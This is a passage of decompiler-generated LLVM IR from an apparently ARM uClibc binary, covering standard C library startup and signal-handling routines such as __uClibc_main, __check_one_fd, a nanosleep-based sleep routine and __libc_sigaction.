  store i32 %v3_174c8, i32* %stack_var_-20, align 4
  %v6_174c8 = load i32, i32* @r5, align 4
  %v9_174c8 = load i32, i32* @r6, align 4
  %v16_174c8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_174cc = icmp eq i32 %arg1, 0
  %v2_174d0 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_174cc, label %dec_label_pc_17654, label %dec_label_pc_174e8.preheader

dec_label_pc_174e8.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_174f017 = add i32 %v16_174c8, 124
  br label %dec_label_pc_174e0

dec_label_pc_174e0:                               ; preds = %dec_label_pc_174e8.preheader, %dec_label_pc_174e0
  %v5_174f018 = phi i32 [ %v5_174f017, %dec_label_pc_174e8.preheader ], [ %v5_174f0, %dec_label_pc_174e0 ]
  %v2_174e4 = add i32 %v5_174f018, -136
  %v3_174e4 = inttoptr i32 %v2_174e4 to i32*
  store i32 0, i32* %v3_174e4, align 4
  %v0_174e8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_174e8 = add i32 %v0_174e8.pre, -1
  store i32 %v1_174e8, i32* %r1.global-to-local, align 4
  %v6_174e8 = icmp slt i32 %v1_174e8, 0
  %v4_174f0 = mul i32 %v1_174e8, 4
  %v5_174f0 = add i32 %v4_174f0, %v16_174c8
  br i1 %v6_174e8, label %dec_label_pc_174f8, label %dec_label_pc_174e0

dec_label_pc_174f8:                               ; preds = %dec_label_pc_174e0
  %v2_174f8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_174f8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_17508 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_17508, i32* %stack_var_-28, align 4
  %v0_17510 = call i32 @__sigaddset()
  store i32 %v0_17510, i32* %r0.global-to-local, align 4
  %v1_17514 = load i32, i32* @r5, align 4
  %v5_17518 = icmp slt i32 %v0_17510, %v1_17514
  br i1 %v5_17518, label %dec_label_pc_1765c, label %dec_label_pc_1751c

dec_label_pc_1751c:                               ; preds = %dec_label_pc_174f8
  %v2_1751c = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_1751c, i32* @r4, align 4
  store i32 %v1_17514, i32* %r0.global-to-local, align 4
  store i32 %v2_174f8, i32* %r1.global-to-local, align 4
  %v3_1752c = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_1752c = call i32 @__GI_sigprocmask(i32 %v1_17514, %_TYPEDEF_sigset_t* %v3_1752c, i32 %v2_1751c)
  store i32 %v4_1752c, i32* %r0.global-to-local, align 4
  %v1_17530 = load i32, i32* @r5, align 4
  %v9_17530 = icmp eq i32 %v4_1752c, %v1_17530
  br i1 %v9_17530, label %dec_label_pc_17538, label %dec_label_pc_1765c

dec_label_pc_17538:                               ; preds = %dec_label_pc_1751c
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_1751c, i32* %r0.global-to-local, align 4
  %v2_17540 = call i32 @__sigismember(i32 %v2_1751c, i32 17)
  store i32 %v2_17540, i32* %r0.global-to-local, align 4
  %v1_17544 = load i32, i32* @r5, align 4
  %v9_17544 = icmp eq i32 %v2_17540, %v1_17544
  br i1 %v9_17544, label %dec_label_pc_1755c.preheader, label %dec_label_pc_17538.dec_label_pc_17624_crit_edge

dec_label_pc_17538.dec_label_pc_17624_crit_edge:  ; preds = %dec_label_pc_17538
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_17624

dec_label_pc_1755c.preheader:                     ; preds = %dec_label_pc_17538
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17554

dec_label_pc_17554:                               ; preds = %dec_label_pc_1755c.preheader, %dec_label_pc_17554
  %v5_1756416 = phi i32 [ %v5_174f017, %dec_label_pc_1755c.preheader ], [ %v5_17564, %dec_label_pc_17554 ]
  %v2_17558 = add i32 %v5_1756416, -136
  %v3_17558 = inttoptr i32 %v2_17558 to i32*
  store i32 0, i32* %v3_17558, align 4
  %v0_1755c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1755c = add i32 %v0_1755c.pre, -1
  store i32 %v1_1755c, i32* %r1.global-to-local, align 4
  %v6_1755c = icmp slt i32 %v1_1755c, 0
  %v4_17564 = mul i32 %v1_1755c, 4
  %v5_17564 = add i32 %v4_17564, %v16_174c8
  br i1 %v6_1755c, label %dec_label_pc_1756c, label %dec_label_pc_17554

dec_label_pc_1756c:                               ; preds = %dec_label_pc_17554
  store i32 %v2_174f8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_17574 = call i32 @__sigaddset()
  store i32 %v0_17574, i32* %r0.global-to-local, align 4
  %v1_17578 = icmp slt i32 %v0_17574, 0
  br i1 %v1_17578, label %dec_label_pc_1765c, label %dec_label_pc_17580

dec_label_pc_17580:                               ; preds = %dec_label_pc_1756c
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_1758c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_174d0)
  store i32 %v4_1758c, i32* %r0.global-to-local, align 4
  %v1_17590 = icmp slt i32 %v4_1758c, 0
  br i1 %v1_17590, label %dec_label_pc_17598, label %dec_label_pc_175c0

dec_label_pc_17598:                               ; preds = %dec_label_pc_17580
  %v0_17598 = call i32 @__errno_location()
  store i32 %v2_1751c, i32* %r1.global-to-local, align 4
  store i32 %v0_17598, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_175ac = inttoptr i32 %v0_17598 to i32*
  %v2_175ac = load i32, i32* %v1_175ac, align 4
  store i32 %v2_175ac, i32* @r4, align 4
  %v3_175b0 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_175b0 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_175b0, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_175b8 = load i32, i32* @r4, align 4
  %v1_175b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_175b8 = inttoptr i32 %v1_175b8 to i32*
  store i32 %v0_175b8, i32* %v2_175b8, align 4
  %v17_17664.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17660

dec_label_pc_175c0:                               ; preds = %dec_label_pc_17580
  %v2_175c0 = load i32, i32* %stack_var_-424, align 4
  %v7_175c4 = icmp eq i32 %v2_175c0, 1
  %v2_175cc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_175cc, i32* @r4, align 4
  br i1 %v7_175c4, label %dec_label_pc_175d4, label %dec_label_pc_17608

dec_label_pc_175d4:                               ; preds = %dec_label_pc_175c0
  store i32 %v2_175cc, i32* %r1.global-to-local, align 4
  store i32 %v2_175cc, i32* %r0.global-to-local, align 4
  %v2_175dc = bitcast i32* %stack_var_-28 to %timespec*
  %v3_175dc = call i32 @__libc_nanosleep(%timespec* %v2_175dc, i32 %v2_175cc)
  store i32 %v3_175dc, i32* %r0.global-to-local, align 4
  store i32 %v3_175dc, i32* %r6.global-to-local, align 4
  %v0_175e4 = call i32 @__errno_location()
  store i32 %v2_1751c, i32* %r1.global-to-local, align 4
  store i32 %v0_175e4, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_175f8 = inttoptr i32 %v0_175e4 to i32*
  %v2_175f8 = load i32, i32* %v1_175f8, align 4
  store i32 %v2_175f8, i32* @r4, align 4
  %v3_175fc = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_175fc = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_175fc, i32 0)
  store i32 %v4_175fc, i32* %r0.global-to-local, align 4
  %v0_17600 = load i32, i32* @r4, align 4
  %v1_17600 = load i32, i32* %r5.global-to-local, align 4
  %v2_17600 = inttoptr i32 %v1_17600 to i32*
  store i32 %v0_17600, i32* %v2_17600, align 4
  %v0_17630.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17630

dec_label_pc_17608:                               ; preds = %dec_label_pc_175c0
  store i32 %v2_1751c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_17614 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_17614 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_17614, i32 0)
  store i32 %v4_17614, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17624

dec_label_pc_17624:                               ; preds = %dec_label_pc_17538.dec_label_pc_17624_crit_edge, %dec_label_pc_17608
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_17538.dec_label_pc_17624_crit_edge ], [ %v2_175cc, %dec_label_pc_17608 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_17628 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_17628 = call i32 @__libc_nanosleep(%timespec* %v2_17628, i32 %storemerge.pre-phi)
  store i32 %v3_17628, i32* %r0.global-to-local, align 4
  store i32 %v3_17628, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17630

dec_label_pc_17630:                               ; preds = %dec_label_pc_175d4, %dec_label_pc_17624
  %v0_17630 = phi i32 [ %v0_17630.pr, %dec_label_pc_175d4 ], [ %v3_17628, %dec_label_pc_17624 ]
  %v2_17630 = icmp eq i32 %v0_17630, 0
  br i1 %v2_17630, label %dec_label_pc_17654, label %dec_label_pc_17638

dec_label_pc_17638:                               ; preds = %dec_label_pc_17630
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17640 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_17640, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17660

dec_label_pc_17654:                               ; preds = %entry, %dec_label_pc_17630
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17660

dec_label_pc_1765c:                               ; preds = %dec_label_pc_1751c, %dec_label_pc_1756c, %dec_label_pc_174f8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17660

dec_label_pc_17660:                               ; preds = %dec_label_pc_17638, %dec_label_pc_17654, %dec_label_pc_17598, %dec_label_pc_1765c
  %v17_17664 = phi i32 [ %v3_17640, %dec_label_pc_17638 ], [ 0, %dec_label_pc_17654 ], [ %v17_17664.pre, %dec_label_pc_17598 ], [ -1, %dec_label_pc_1765c ]
  %v2_17664 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17664, i32* @r4, align 4
  store i32 %v6_174c8, i32* @r5, align 4
  store i32 %v9_174c8, i32* @r6, align 4
  ret i32 %v17_17664

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_175cc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_1755c, { 0, 2, 1 }
  uselistorder i32 %v2_1751c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_17514, { 1, 0, 2 }
  uselistorder i32 %v1_174e8, { 0, 2, 1 }
  uselistorder i32 %v16_174c8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_17660, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1765c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17654, { 1, 0 }
  uselistorder label %dec_label_pc_17630, { 1, 0 }
  uselistorder label %dec_label_pc_17624, { 1, 0 }
  uselistorder label %dec_label_pc_17554, { 1, 0 }
  uselistorder label %dec_label_pc_174e0, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_17698:
  %stack_var_-8 = alloca i32, align 4
  %v3_1766c = load i32, i32* @r4, align 4
  store i32 %v3_1766c, i32* %stack_var_-8, align 4
  %v2_1769c = load i32, i32* @global_var_31814.1509, align 4
  %v2_176a0 = icmp eq i32 %v2_1769c, 0
  br i1 %v2_176a0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_17698
  call void @__pseudo_branch(i32 %v2_1769c)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17698, %bb
  %v2_176b0 = load i32, i32* @global_var_31818.1511, align 4
  %v2_176b4 = icmp eq i32 %v2_176b0, 0
  br i1 %v2_176b4, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_176b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_176b8, i32* @r4, align 4
  %v9_176b8 = load i32, i32* @r0, align 4
  ret i32 %v9_176b8

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_176b0)
  %v2_176c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_176c4, i32* @r4, align 4
  %v8_176c4 = load i32, i32* @r0, align 4
  ret i32 %v8_176c4

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_176e0 = load i32, i32* @r0, align 4
  ret i32 %v1_176e0
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_176e4 = load i32, i32* @r4, align 4
  store i32 %v3_176e4, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_176f4 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_176f8 = icmp eq i32 %v2_176f4, -1
  br i1 %v7_176f8, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_176fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_176fc, i32* @r4, align 4
  ret i32 %v2_176f4

bb4:                                              ; preds = %entry
  %v0_17700 = load i32, i32* @r4, align 4
  %v4_17708 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22c6c.1514, i32 0, i32 0), i32 %v0_17700)
  %v1_1770c = load i32, i32* %r5.global-to-local, align 4
  %v9_1770c = icmp eq i32 %v4_17708, %v1_1770c
  br i1 %v9_1770c, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_17710 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_17710, i32* @r4, align 4
  ret i32 %v4_17708

bb6:                                              ; preds = %bb4
  %v0_17714 = call i32 @abort()
  %v0_17718 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17718, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v1_17718 = load i32, i32* @r2, align 4
  %v2_17718 = load i32, i32* @ip, align 4
  %v3_17718 = udiv i32 %v2_17718, 16777216
  %v4_17718 = mul i32 %v2_17718, 256
  %v5_17718 = or i32 %v3_17718, %v4_17718
  %v8_17718 = and i32 %v5_17718, %v1_17718
  store i32 %v8_17718, i32* @r2, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_17714

; uselistorder directives
  uselistorder i32 %v2_176f4, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_17720 = load i32, i32* @global_var_3181c.1516, align 4
  %v2_17724 = icmp eq i32 %v2_17720, 0
  br i1 %v2_17724, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_17730 = load i32, i32* @r0, align 4
  ret i32 %v6_17730

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_3181c.1516, align 4
  store i32 4096, i32* @global_var_31810.1429, align 4
  %v0_17764 = call i32 @_stdio_init()
  ret i32 %v0_17764
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_1777c = mul i32 %arg2, 4
  %v5_1777c = add i32 %tmp, %v4_1777c
  %v2_17780 = load i32, i32* %arg3, align 4
  %v2_17784 = ptrtoint i32* %stack_var_-120 to i32
  %v1_17788 = add i32 %v5_1777c, 4
  store i32 %v1_17788, i32* @ip, align 4
  %v9_1778c = icmp eq i32 %v1_17788, %v2_17780
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_31808.1521, align 4
  store i32 %v1_17788, i32* @global_var_3180c.1503, align 4
  store i32 %arg6, i32* @global_var_31818.1511, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_1778c, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_1777c, i32* @global_var_3180c.1503, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_177cc = bitcast i32* %stack_var_-120 to i8*
  %v3_177cc = call i32 @__GI_memset(i8* %v2_177cc, i32 0)
  %storemerge.pre = load i32, i32* @global_var_3180c.1503, align 4
  br label %dec_label_pc_177dc

dec_label_pc_177dc:                               ; preds = %dec_label_pc_177dc, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_177dc, %dec_label_pc_177dc ]
  %v1_177dc = inttoptr i32 %storemerge to i32*
  %v2_177dc = load i32, i32* %v1_177dc, align 4
  %v4_177dc = add i32 %storemerge, 4
  %v2_177e0 = icmp eq i32 %v2_177dc, 0
  br i1 %v2_177e0, label %dec_label_pc_177ec, label %dec_label_pc_177dc

dec_label_pc_177ec:                               ; preds = %dec_label_pc_177dc
  store i32 %v4_177dc, i32* @r4, align 4
  %v1_1780c22 = inttoptr i32 %v4_177dc to i32*
  %v2_1780c23 = load i32, i32* %v1_1780c22, align 4
  %v2_1781025 = icmp eq i32 %v2_1780c23, 0
  br i1 %v2_1781025, label %dec_label_pc_17818, label %dec_label_pc_177f4

dec_label_pc_177f4:                               ; preds = %dec_label_pc_177ec, %dec_label_pc_1780c
  %v5_177f8 = phi i32 [ %v2_1780c, %dec_label_pc_1780c ], [ %v2_1780c23, %dec_label_pc_177ec ]
  %v2_177f4 = icmp ugt i32 %v5_177f8, 13
  %v7_177f4 = icmp eq i32 %v5_177f8, 14
  %v2_177f8 = xor i1 %v2_177f4, true
  %v3_177f8 = or i1 %v7_177f4, %v2_177f8
  br i1 %v3_177f8, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_177f4
  %v6_177f8 = and i32 %v5_177f8, 536870912
  %v7_177f8 = icmp ne i32 %v6_177f8, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_177f4, %bb42
  %v1_17804 = phi i1 [ %v2_177f4, %dec_label_pc_177f4 ], [ %v7_177f8, %bb42 ]
  %v2_177fc = xor i1 %v1_17804, true
  %v3_177fc = or i1 %v7_177f4, %v2_177fc
  br i1 %v3_177fc, label %bb44, label %dec_label_pc_1780c

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_1780c

dec_label_pc_1780c:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_177fc, i32 ptrtoint (i32* @global_var_15710.1524 to i32))
  %v0_17808 = load i32, i32* @r4, align 4
  %v1_17808 = add i32 %v0_17808, 8
  store i32 %v1_17808, i32* @r4, align 4
  %v1_1780c = inttoptr i32 %v1_17808 to i32*
  %v2_1780c = load i32, i32* %v1_1780c, align 4
  %v2_17810 = icmp eq i32 %v2_1780c, 0
  br i1 %v2_17810, label %dec_label_pc_17818, label %dec_label_pc_177f4

dec_label_pc_17818:                               ; preds = %dec_label_pc_1780c, %dec_label_pc_177ec
  %v1_1781c = call i32 @_dl_aux_init(i32 %v2_17784)
  store i32 %v1_1781c, i32* @r0, align 4
  %v1_17820 = call i32 @__GI___uClibc_init(i32 %v1_1781c)
  store i32 %v1_17820, i32* @r0, align 4
  %v2_1782c = icmp eq i32 %tmp37, 0
  br i1 %v2_1782c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_17818
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_17818, %bb45
  %v0_1783c = phi i32 [ %tmp37, %dec_label_pc_17818 ], [ 4096, %bb45 ]
  %v3_17834 = icmp eq i32 %tmp36, -1
  %v8_17834 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_31810.1429 to i32), i32* @r2, align 4
  store i32 %v0_1783c, i32* @global_var_31810.1429, align 4
  br i1 %v3_17834, label %dec_label_pc_17844, label %dec_label_pc_1786c

dec_label_pc_17844:                               ; preds = %bb46
  %v0_17844 = call i32 @getuid()
  store i32 %v0_17844, i32* @r0, align 4
  store i32 %v0_17844, i32* @r4, align 4
  %v0_1784c = call i32 @geteuid()
  %v0_17850 = load i32, i32* @r4, align 4
  %v9_17850 = icmp eq i32 %v0_17850, %v0_1784c
  br i1 %v9_17850, label %dec_label_pc_17858, label %dec_label_pc_17894

dec_label_pc_17858:                               ; preds = %dec_label_pc_17844
  %v1_17858 = call i32 @getgid(i32 %v0_1784c)
  store i32 %v1_17858, i32* @r0, align 4
  store i32 %v1_17858, i32* @r4, align 4
  %v0_17860 = call i32 @getegid()
  %v0_17864 = load i32, i32* @r4, align 4
  %v9_17864 = icmp eq i32 %v0_17864, %v0_17860
  br i1 %v9_17864, label %dec_label_pc_1786c, label %dec_label_pc_17894

dec_label_pc_1786c:                               ; preds = %dec_label_pc_17858, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_17834, label %dec_label_pc_17900, label %dec_label_pc_17878

dec_label_pc_17878:                               ; preds = %dec_label_pc_1786c
  %v9_1787c = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_1787c, label %dec_label_pc_17884, label %dec_label_pc_17894

dec_label_pc_17884:                               ; preds = %dec_label_pc_17878
  br label %dec_label_pc_17894

dec_label_pc_17894:                               ; preds = %dec_label_pc_17884, %dec_label_pc_17878, %dec_label_pc_17858, %dec_label_pc_17844
  %v2_1789c = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_178a8 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_178b4 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_17900

dec_label_pc_17900:                               ; preds = %dec_label_pc_17894, %dec_label_pc_1786c
  %v0_178c4 = load i32, i32* @r6, align 4
  %v1_178c4 = inttoptr i32 %v0_178c4 to i32*
  %v2_178c4 = load i32, i32* %v1_178c4, align 4
  store i32 %v2_178c4, i32* @global_var_2b588, align 4
  store i32 %arg5, i32* @global_var_31814.1509, align 4
  %v2_17900 = icmp eq i32 %arg4, 0
  br i1 %v2_17900, label %dec_label_pc_1793c, label %bb47

bb47:                                             ; preds = %dec_label_pc_17900
  br label %dec_label_pc_1793c

dec_label_pc_1793c:                               ; preds = %dec_label_pc_17900, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_1794c = call i32 @__errno_location()
  %v2_17954 = inttoptr i32 %v1_1794c to i32*
  store i32 0, i32* %v2_17954, align 4
  %v1_17968 = call i32 @__GI___h_errno_location()
  %v2_17970 = inttoptr i32 %v1_17968 to i32*
  store i32 0, i32* %v2_17970, align 4
  %v0_17980 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_1798c = call i32 @__GI_exit(i32 %v0_17980)
  ret i32 %v1_1798c

; uselistorder directives
  uselistorder i32 %v2_1780c, { 1, 0 }
  uselistorder i32 %v1_17808, { 1, 0 }
  uselistorder i1 %v2_177f4, { 1, 0 }
  uselistorder i32 %v4_177dc, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_31810.1429, { 1, 4, 0, 2, 3 }
  uselistorder i32 14, { 2, 1, 0 }
  uselistorder i32 13, { 1, 3, 0, 2 }
  uselistorder i32 120, { 2, 0, 1 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1793c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_1780c, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_177f4, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_179c4 = load i32, i32* @r4, align 4
  %v6_179c4 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_179c8 = icmp eq i32* %arg2, null
  %v2_179cc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_179c8, label %dec_label_pc_17a38, label %dec_label_pc_179dc

dec_label_pc_179dc:                               ; preds = %entry
  %v2_179e0 = load i32, i32* %arg2, align 4
  %v4_179e0 = add i32 %tmp, 4
  store i32 %v4_179e0, i32* @r1, align 4
  %v2_179e4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_179e4, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_179e0, i32* %stack_var_-156, align 4
  %v0_179f0 = call i32 @memcpy()
  store i32 %v0_179f0, i32* %r0.global-to-local, align 4
  %v0_179f4 = load i32, i32* @r4, align 4
  %v1_179f4 = add i32 %v0_179f4, 132
  %v2_179f4 = inttoptr i32 %v1_179f4 to i32*
  %v3_179f4 = load i32, i32* %v2_179f4, align 4
  %v1_179f8 = and i32 %v3_179f4, 67108864
  %v2_179f8 = icmp eq i32 %v1_179f8, 0
  br i1 %v2_179f8, label %dec_label_pc_17a0c, label %bb

bb:                                               ; preds = %dec_label_pc_179dc
  br label %dec_label_pc_17a28

dec_label_pc_17a0c:                               ; preds = %dec_label_pc_179dc
  %v1_17a14 = and i32 %v3_179f4, 4
  %v2_17a14 = icmp eq i32 %v1_17a14, 0
  br i1 %v2_17a14, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_17a0c
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_17a0c, %bb20
  br label %dec_label_pc_17a28

dec_label_pc_17a28:                               ; preds = %bb, %bb21
  %v2_17a28 = icmp eq i32 %v0_179f4, 0
  %v3_17a2c = ptrtoint i32* %stack_var_-156 to i32
  %.v3_17a2c = select i1 %v2_17a28, i32 0, i32 %v3_17a2c
  %v0_17a38.pre = load i32, i32* @r5, align 4
  %v0_17a48.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17a38

dec_label_pc_17a38:                               ; preds = %dec_label_pc_17a28, %entry
  %v0_17a48 = phi i32 [ %arg1, %entry ], [ %v0_17a48.pre, %dec_label_pc_17a28 ]
  %v0_17a38 = phi i32 [ %arg3, %entry ], [ %v0_17a38.pre, %dec_label_pc_17a28 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_17a2c, %dec_label_pc_17a28 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_17a38 = icmp eq i32 %v0_17a38, 0
  %.v2_179cc = select i1 %v2_17a38, i32 0, i32 %v2_179cc
  store i32 %.v2_179cc, i32* @r2, align 4
  store i32 %v0_17a48, i32* %r0.global-to-local, align 4
  %v1_17a4c = call i32 @__syscall_rt_sigaction(i32 %v0_17a48)
  store i32 %v1_17a4c, i32* %r0.global-to-local, align 4
  %v0_17a50 = load i32, i32* @r5, align 4
  %v2_17a50 = icmp eq i32 %v0_17a50, 0
  br i1 %v2_17a50, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_17a38
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_17a38, %bb25
  %v0_17a60.pr = phi i32 [ 0, %dec_label_pc_17a38 ], [ 1, %bb25 ]
  %v1_17a58 = icmp slt i32 %v1_17a4c, 0
  br i1 %v1_17a58, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_17a94

thread-pre-split:                                 ; preds = %bb26
